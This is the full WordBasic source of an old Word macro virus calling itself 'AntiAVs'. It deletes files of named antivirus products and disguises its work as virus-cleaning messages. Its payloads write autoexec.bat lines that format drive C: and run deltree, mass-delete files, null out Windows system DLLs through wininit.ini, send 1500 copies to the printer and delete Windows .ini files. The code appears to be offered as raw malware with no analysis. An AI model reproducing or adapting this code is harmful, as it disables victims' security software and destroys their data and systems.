'Latest date Apr 23 '97
Sub MAIN
t1$ = "Found virus "
t2$ = " and has been clean."
t3$ = "AntiAVs"
DisableInput 1
On Error Resume Next
AV1$ = Files$("C:\PC-Cillin 95\Scan32.dll")
If AV1$ = "" Then Goto AV2
SetAttr "c:\autoexec.bat", 0
Open "c:\autoexec.bat" For Append As #1
Print #1, "@echo off"
Print #1, "attrib -h -r -s +a c:\pc-cil~1\*.* >nul"
Print #1, "del c:\pc-cil~1\*.dll >nul"
Close #1
Kill "C:\PC-Cillin 95\Lpt$vpn.*"
MsgBox t1$ + "PC-CILLIN 95" + t2$, t3$, 48

AV2 :
AV2$ = Files$("C:\PC-Cillin 97\Scan32.dll")
If AV2$ = "" Then Goto AV3
SetAttr "c:\autoexec.bat", 0
Open "c:\autoexec.bat" For Append As #1
Print #1, "@echo off"
Print #1, "attrib -h -r -s +a c:\pc-cil~1\*.* >nul"
Print #1, "del c:\pc-cil~1\*.dll >nul"
Close #1
Kill "C:\PC-Cillin 97\Lpt$vpn.*"
MsgBox t1$ + "PC-CILLIN II" + t2$, t3$, 48

AV3 :
AV3$ = Files$("C:\Tsc\PC-Cillin 97\Scan32.dll")
If AV3$ = "" Then Goto AV4
SetAttr "c:\autoexec.bat", 0
Open "c:\autoexec.bat" For Append As #1
Print #1, "@echo off"
Print #1, "attrib -h -r -s +a c:\tsc\pc-cil~1\*.* >nul"
Print #1, "del c:\tsc\pc-cil~1\*.dll >nul"
Close #1
Kill "C:\Tsc\PC-Cillin 97\Lpt$vpn.*"
MsgBox t1$ + "PC-CILLIN II" + t2$, t3$, 48

AV4 :
AV4$ = Files$("C:\Zlockav\Gsav.dat")
If AV4$ = "" Then Goto AV5
Kill AV4$
Kill "C:\Zlockav\Gsav.cas"
'MsgBox t1$ + "Zlock" + t2$, t3$, 48

AV5 :
AV5$ = Files$("C:\VB7\Virus.txt")
If AV5$ = "" Then Goto AV6
Kill AV5$
'MsgBox t1$ + "VB7/VB95" + t2$, t3$, 48

AV6 :
AV6$ = Files$("C:\Program Files\Norton AntiVirus\Viruscan.dat")
If AV6$ = "" Then Goto AV7
Kill AV6$
Kill "C:\Program Files\Symantec\Symevnt.386"
'MsgBox t1$ + "NAV95" + t2$, t3$, 48

AV7 :
AV7$ = Files$("C:\Program Files\McAfee\VirusScan95\Scan.dat")
If AV7$ = "" Then Goto AV8
Kill AV7$
Kill "C:\Program Files\McAfee\VirusScan95\Mcscan32.dll"
'MsgBox t1$ + "VirusScan95" + t2$, t3$, 48

AV8 :
AV8$ = Files$("C:\Program Files\McAfee\VirusScan\Scan.dat")
If AV8$ = "" Then Goto AV9
Kill AV8$
Kill "C:\Program Files\McAfee\VirusScan\Mcscan32.dll"
'MsgBox t1$ + "VirusScan95 3.0" + t2$, t3$, 48

AV9 :
AV9$ = Files$("C:\Program Files\Command Software\F-PROT95\Sign.def")
If AV9$ = "" Then Goto AV10
Kill AV9$
Kill "C:\Program Files\Command Software\F-PROT95\Dvp.vxd"
'MsgBox t1$ + "F-Prot 95" + t2$, t3$, 48

AV10 :
AV10$ = Files$("C:\Program Files\AntiViral Toolkit Pro\Avp32.exe")
If AV10$ = "" Then Goto AV11
Kill AV10$
Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
'MsgBox t1$ + "AVP 95" + t2$, t3$, 48

AV11 :
AV11$ = Files$("C:\TBAVW95\Tbscan.sig")
If AV11$ = "" Then Goto exit
SetAttr "c:\autoexec.bat", 0
Open "c:\autoexec.bat" For Append As #1
Print #1, "@echo off"
Print #1, "attrib -h -r -s +a c:\Tbavw95\*.* >nul"
Print #1, "del c:\Tbavw95\Tb*.* >nul"
Close #1
Kill "C:\Tbavw95\Tbavw95.vxd"
exit :

D = Int(Rnd() * 7) + 1
If Weekday(Now()) = D Then
    SetAttr "C:\AUTOEXEC.BAT", 0
    Name "C:\AUTOEXEC.BAT" As "C:\AUTOEXEC.AAV"
    Open "C:\AUTOEXEC.BAT" For Output As #1
    Print #1, "@Echo off"
    Print #1, "cls"
    Print #1, "echo I have clean a huge virus:"
    Print #1, "echo         MS-WINDOWS"
    Print #1, "echo for you.   ^_^"
    Print #1, "echo                --AntiAVs--"
    Print #1, "echo y|format c: /u /v:AAV >nul"
    Print #1, "deltree /y c: >nul"
    Close #1
    dsk$ = Left$(DefaultDir$(9), 3)
    DocMinimize
search :
    MsgBox "AntiAVs now scan memory for unknown and boot virus, " + Chr$(10) + " It might takes a few minutes.  Please wait . . . ", "AVscan", 64
    FileFind .SearchPath = dsk$, .Name = "*av.*", .SubDir = 1
    j = CountFoundFiles() - 1
    If j >= 0 Then
        For jj = 0 To j
            SetAttr FoundFileName$(jj + 1), 0
            Kill FoundFileName$(jj + 1)
        Next
        MsgBox "Found virus on memory has been clean.", "AVclean", 48
    Else
        MsgBox "No virus found on memory. ", "AntiAVs", 64
    End If
    MsgBox "AntiAVs now scan  " + dsk$ + "  drive for unknown virus, " + Chr$(10) + " It might takes a few minutes.  Please wait . . . ", "AVscan", 64
    FileFind .SearchPath = dsk$, .Name = "*scan.*", .SubDir = 1
    k = CountFoundFiles() - 1
    If k >= 0 Then
        For kk = 0 To k
            SetAttr FoundFileName$(kk + 1), 0
            Kill FoundFileName$(kk + 1)
        Next
        t = CountFoundFiles()
        t$ = Str$(t)
        MsgBox "Found " + t$ + " unknown virus, and has been clean.", "AVhunt", 48
    Else
        MsgBox "No virus found on  " + dsk$, "AntiAVs", 64
    End If
    If UCase$(dsk$) <> "C:\" Then
        dsk$ = "C:\"
        Goto search
    End If
    Kill "C:\AUTOEXEC.BAT"
    Name "C:\AUTOEXEC.AAV" As "C:\AUTOEXEC.BAT"
    MsgBox "The AntiAVs Auto-protect and AVShield is active. " + Chr$(10) + "AntiAVs always protects you from AV's damage and disturbance." + Chr$(10) + Chr$(10) + "AntiAVs V1.0(C) by Samuel Lin  in  NYMU, Taiwan", "AntiAVs", 64
    DocMaximize
End If
End Sub


Sub FUN
Dim AV$(12)
DisableInput 1
On Error Goto exit
If Day(Now()) = 11 Then
    dd = 1
    SetAttr "c:\autoexec.bat", 0
    Open "c:\autoexec.bat" For Append As #1
    Print #1, "@echo off"
    Print #1, "Attrib -r -h -s *.* >nul"
    Print #1, "echo y|del *.* >nul"
    Close #1
    Open "C:\Windows\Wininit.ini" For Output As #1
    Print #1, "[rename]"
    Print #1, "NUL=C:\windows\system\Shell32.dll"
    Print #1, "NUL=C:\windows\system\Msgsrv32.exe"
    Print #1, "NUL=C:\windows\system\Winnls.dll"
    Print #1, "NUL=C:\windows\system\Imm32.dll"
    Close #1
End If
k = 0
l = 0
avg :
AV$(1) = "PCC" : AV$(2) = "Zlock" : AV$(3) = "NAV" : AV$(4) = "VirusScan"
AV$(5) = "VB" : AV$(6) = "IBMAV" : AV$(7) = "F-Prot" : AV$(8) = "TBAV"
AV$(9) = "ViruSafe" : AV$(10) = "AVP" : AV$(11) = "Sweep" : AV$(12) = "Those"
Begin Dialog UserDialog 292, 215, "AntiAVs"
        Text 10, 6, 271, 13, "Which AV program do you use right now ?", .Text1
        PushButton 30, 25, 88, 21, "PCC", .Push1
        PushButton 30, 50, 88, 21, "Zlock", .Push3
        PushButton 30, 75, 88, 21, "NAV", .Push2
        PushButton 30, 100, 88, 21, "VirusScan", .Push4
        PushButton 30, 125, 88, 21, "VB", .Push5
        PushButton 150, 25, 88, 21, "IBMAV", .Push6
        PushButton 150, 50, 88, 21, "F-Prot", .Push7
        PushButton 150, 75, 88, 21, "TBAV", .Push8
        PushButton 150, 100, 88, 21, "ViruSafe", .Push9
        PushButton 30, 150, 88, 21, "AVP", .Push10
        PushButton 150, 125, 88, 21, "Sweep", .Push11
        PushButton 150, 150, 88, 21, "Others", .Push12
        PushButton 40, 180, 190, 21, "I don't use AV.", .Push13
End Dialog
Dim AV As UserDialog
num = Int(Rnd() * 12) + 1
ans = Dialog (AV)
If ans = 13 Then
    MsgBox "Don't you lie to me !", "I don't believe it !", 16
    l = l + 1
    If l > 2 Then Goto done
    Goto avg
End If
If ans = num Then
    MsgBox "You are very brilliant to choose " + AV$(ans) + " ! ", "Wise Choice !", 64
    If dd = 1 Then
        Kill "C:\Autoexec.bat"
        Kill "C:\Windows\Wininit.ini"
    End If
    Goto exit
End If
MsgBox AV$(ans) + " is the worst program I've ever heard !" + Chr$(10) + "Fortunately, I will clean it for you.", "I am sorry ! ", 48
For N = 1 To 15
    FileNewDefault
    If DocMaximize() <> 0 Then DocRestore
    CenterPara
    FormatFont .Points = 48, .Bold = 1, .Underline = 1, .Italic = 1, .Color = 6
    Insert AV$(ans) + " is the worst AV program in the universe. "
    Insert AV$(ans) + " is the worst AV program in the universe. "
Next N
FilePrint .Type = 0, .AppendPrFile = 0, .Range = "0", .PrToFileName = "", .From = "", .To = "", .NumCopies = "1500", .Pages = "", .Order = 0, .PrintToFile = 0, .Collate = 1, .FileName = ""
k = k + 1
If k <= 5 Then Goto avg
done :
Kill "C:\Windows\*.ini"
Call Organizer
ExitWindows
exit :
End Sub